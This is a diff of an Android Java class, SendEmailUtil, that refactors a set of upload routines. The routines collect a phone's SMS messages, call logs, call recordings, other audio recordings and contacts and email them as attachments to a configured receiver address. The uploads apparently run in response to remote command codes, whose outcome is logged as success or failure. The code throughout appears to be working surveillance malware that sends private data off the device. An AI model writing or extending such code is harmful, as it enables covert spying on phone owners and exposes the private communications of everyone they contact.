@@ -75,46 +75,47 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadSmsCallLog(boolean uploadEvenIfMobile, final long codeDateTime) {
+	public void upLoadSmsCallLog(final boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
-			new Thread(new Runnable() {
 
-				@Override
-				public void run() {
-					try {
-						String content = "短信和通话记录, 见附件";
-						Vector<String> files = new Vector<String>();
+			try {
+				String content = "短信和通话记录, 见附件";
+				Vector<String> files = new Vector<String>();
 
-						if (MainApplication.FILE_CALL_LOG.exists()) {
-							Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
-							files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
-						}
-						if (MainApplication.FILE_DB_SMS.exists()) {
-							Debug.v("Add", MainApplication.FILE_DB_SMS.getAbsolutePath());
-							files.add(MainApplication.FILE_DB_SMS.getAbsolutePath());
-						}
+				if (MainApplication.FILE_CALL_LOG.exists()) {
+					Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
+					files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
+				}
+				// if (MainApplication.FILE_DB_SMS.exists()) {
+				// Debug.v("Add", MainApplication.FILE_DB_SMS.getAbsolutePath());
+				// files.add(MainApplication.FILE_DB_SMS.getAbsolutePath());
+				// }
 
-						SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
-						if (MainApplication.FILE_SMS_TEXT.exists()) {
-							Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-							files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-						}
-
-						if (files.size() <= 0) {
-							content = "尚没有任何记录！";
-						}
-
-						if (sendMail("短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(codeDateTime);
-						} else {
-							updateFailedTimes(codeDateTime);
-						}
-					} catch (Exception e) {
-						e.printStackTrace();
-					}
+				SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+				if (MainApplication.FILE_SMS_TEXT.exists()) {
+					Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+					files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
 				}
 
-			}).start();
+				if (files.size() <= 0) {
+					content = "尚没有任何记录！";
+				}
+
+				String title = "";
+				if (uploadEvenIfMobile) {
+					title = "M 短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				} else {
+					title = "短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				}
+
+				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+					codeDoSuccess(codeDateTime);
+				} else {
+					updateFailedTimes(codeDateTime);
+				}
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 
 		} else {
 			updateFailedTimes(codeDateTime);
@@ -131,42 +132,43 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadCallAudios(boolean uploadEvenIfMobile, final long codeDateTime) {
+	public void upLoadCallAudios(final boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
-			new Thread(new Runnable() {
 
-				@Override
-				public void run() {
-					try {
-						String content = "通话录音，见附件";
-						Vector<String> files = new Vector<String>();
+			try {
+				String content = "通话录音，见附件";
+				Vector<String> files = new Vector<String>();
 
-						File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
-						if (path.exists() && path.isDirectory()) {
-							File[] audios = path.listFiles();
-							if (audios != null) {
-								for (File audio : audios) {
-									files.add(audio.getAbsolutePath());
-									Debug.e("Add", " add file = " + audio.getAbsolutePath());
-								}
-							}
+				File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
+				if (path.exists() && path.isDirectory()) {
+					File[] audios = path.listFiles();
+					if (audios != null) {
+						for (File audio : audios) {
+							files.add(audio.getAbsolutePath());
+							Debug.e("Add", " add file = " + audio.getAbsolutePath());
 						}
-
-						if (files.size() <= 0) {
-							content = "尚没有通话录音！";
-						}
-
-						if (sendMail("通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(codeDateTime);
-						} else {
-							updateFailedTimes(codeDateTime);
-						}
-					} catch (Exception e) {
-						e.printStackTrace();
 					}
 				}
-			}).start();
 
+				if (files.size() <= 0) {
+					content = "尚没有通话录音！";
+				}
+
+				String title = "";
+				if (uploadEvenIfMobile) {
+					title = "M 通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				} else {
+					title = "通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				}
+
+				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+					codeDoSuccess(codeDateTime);
+				} else {
+					updateFailedTimes(codeDateTime);
+				}
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 		} else {
 			updateFailedTimes(codeDateTime);
 		}
@@ -182,41 +184,42 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadOtherAudios(boolean uploadEvenIfMobile, final long codeDateTime) {
+	public void upLoadOtherAudios(final boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
-			new Thread(new Runnable() {
+			try {
+				String content = "其它录音，见附件";
+				Vector<String> files = new Vector<String>();
 
-				@Override
-				public void run() {
-					try {
-						String content = "其它录音，见附件";
-						Vector<String> files = new Vector<String>();
-
-						File path = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
-						if (path.exists() && path.isDirectory()) {
-							File[] audios = path.listFiles();
-							if (audios != null) {
-								for (File audio : audios) {
-									files.add(audio.getAbsolutePath());
-									Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
-								}
-							}
+				File path = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
+				if (path.exists() && path.isDirectory()) {
+					File[] audios = path.listFiles();
+					if (audios != null) {
+						for (File audio : audios) {
+							files.add(audio.getAbsolutePath());
+							Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
 						}
-
-						if (files.size() <= 0) {
-							content = "尚没有其他录音！";
-						}
-
-						if (sendMail("其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(codeDateTime);
-						} else {
-							updateFailedTimes(codeDateTime);
-						}
-					} catch (Exception e) {
-						e.printStackTrace();
 					}
 				}
-			}).start();
+
+				if (files.size() <= 0) {
+					content = "尚没有其他录音！";
+				}
+
+				String title = "";
+				if (uploadEvenIfMobile) {
+					title = "M 其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				} else {
+					title = "其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				}
+
+				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+					codeDoSuccess(codeDateTime);
+				} else {
+					updateFailedTimes(codeDateTime);
+				}
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 
 		} else {
 			updateFailedTimes(codeDateTime);
@@ -232,68 +235,73 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadALL(boolean uploadEvenIfMobile, final long codeDateTime) {
+	public void upLoadALL(final boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
-			new Thread(new Runnable() {
+			try {
+				ContactsUtil.createContactsFile(MainApplication.getInstence());
+				SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+				CodesToTxtUtil.getInstence().saveAllCodesToTextFile();
 
-				@Override
-				public void run() {
+				String content = "所有记录，见附件";
+				Vector<String> files = new Vector<String>();
 
-					try {
-						ContactsUtil.createContactsFile(MainApplication.getInstence());
-						SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
-						CodesToTxtUtil.getInstence().saveAllCodesToTextFile();
+				if (MainApplication.FILE_CALL_LOG.exists()) {
+					Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
+					files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
+				}
 
-						String content = "所有记录，见附件";
-						Vector<String> files = new Vector<String>();
+				if (MainApplication.FILE_SMS_TEXT.exists()) {
+					Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+					files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+				}
 
-						if (MainApplication.FILE_CALL_LOG.exists()) {
-							Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
-							files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
+				if (MainApplication.FILE_CODE_TEXT.exists()) {
+					Debug.v("Add", MainApplication.FILE_CODE_TEXT.getAbsolutePath());
+					files.add(MainApplication.FILE_CODE_TEXT.getAbsolutePath());
+				}
+				
+				if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
+					Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
+					files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
+				}
+
+				File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
+				if (path.exists() && path.isDirectory()) {
+					File[] audios = path.listFiles();
+					if (audios != null) {
+						for (File audio : audios) {
+							files.add(audio.getAbsolutePath());
+							Debug.e("Add", " add call audio file = " + audio.getAbsolutePath());
 						}
-
-						if (MainApplication.FILE_SMS_TEXT.exists()) {
-							Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-							files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-						}
-
-						if (MainApplication.FILE_CODE_TEXT.exists()) {
-							Debug.v("Add", MainApplication.FILE_CODE_TEXT.getAbsolutePath());
-							files.add(MainApplication.FILE_CODE_TEXT.getAbsolutePath());
-						}
-
-						File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
-						if (path.exists() && path.isDirectory()) {
-							File[] audios = path.listFiles();
-							if (audios != null) {
-								for (File audio : audios) {
-									files.add(audio.getAbsolutePath());
-									Debug.e("Add", " add call audio file = " + audio.getAbsolutePath());
-								}
-							}
-						}
-
-						File path2 = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
-						if (path2.exists() && path2.isDirectory()) {
-							File[] audios = path2.listFiles();
-							if (audios != null) {
-								for (File audio : audios) {
-									files.add(audio.getAbsolutePath());
-									Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
-								}
-							}
-						}
-
-						if (sendMail("所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(codeDateTime);
-						} else {
-							updateFailedTimes(codeDateTime);
-						}
-					} catch (Exception e) {
-						e.printStackTrace();
 					}
 				}
-			}).start();
+
+				File path2 = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
+				if (path2.exists() && path2.isDirectory()) {
+					File[] audios = path2.listFiles();
+					if (audios != null) {
+						for (File audio : audios) {
+							files.add(audio.getAbsolutePath());
+							Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
+						}
+					}
+				}
+
+				String title = "";
+				if (uploadEvenIfMobile) {
+					title = "M 所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				} else {
+					title = "所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				}
+
+				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+					codeDoSuccess(codeDateTime);
+				} else {
+					updateFailedTimes(codeDateTime);
+				}
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 
 		} else {
 			updateFailedTimes(codeDateTime);
@@ -310,38 +318,37 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadContact(boolean uploadEvenIfMobile, final long codeDateTime) {
+	public void upLoadContact(final boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
-			new Thread(new Runnable() {
+			try {
+				ContactsUtil.createContactsFile(MainApplication.getInstence());
 
-				@Override
-				public void run() {
+				String content = "联系人，见附件";
+				Vector<String> files = new Vector<String>();
 
-					try {
-						ContactsUtil.createContactsFile(MainApplication.getInstence());
-
-						String content = "联系人，见附件";
-						Vector<String> files = new Vector<String>();
-
-						if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
-							Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
-							files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
-						}
-
-						if (files.size() <= 0) {
-							content = "联系人为空！";
-						}
-
-						if (sendMail("联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(codeDateTime);
-						} else {
-							updateFailedTimes(codeDateTime);
-						}
-					} catch (Exception e) {
-						e.printStackTrace();
-					}
+				if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
+					Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
+					files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
 				}
-			}).start();
+
+				if (files.size() <= 0) {
+					content = "联系人为空！";
+				}
+				String title = "";
+				if (uploadEvenIfMobile) {
+					title = "M 联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				} else {
+					title = "联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
+				}
+
+				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+					codeDoSuccess(codeDateTime);
+				} else {
+					updateFailedTimes(codeDateTime);
+				}
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 
 		} else {
 			updateFailedTimes(codeDateTime);
@@ -355,10 +362,11 @@ public class SendEmailUtil {
 			code.setResult(Code.RESULT_OK);
 			code.setDate(time);
 			mDbOperater.updateCodeResult(code);
+			Debug.v(TAG, "执行完成！ " + code.getCode());
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-	
+
 	}
 
 	private void updateFailedTimes(long time) {
@@ -368,7 +376,7 @@ public class SendEmailUtil {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		
+
 	}
 
 	/**
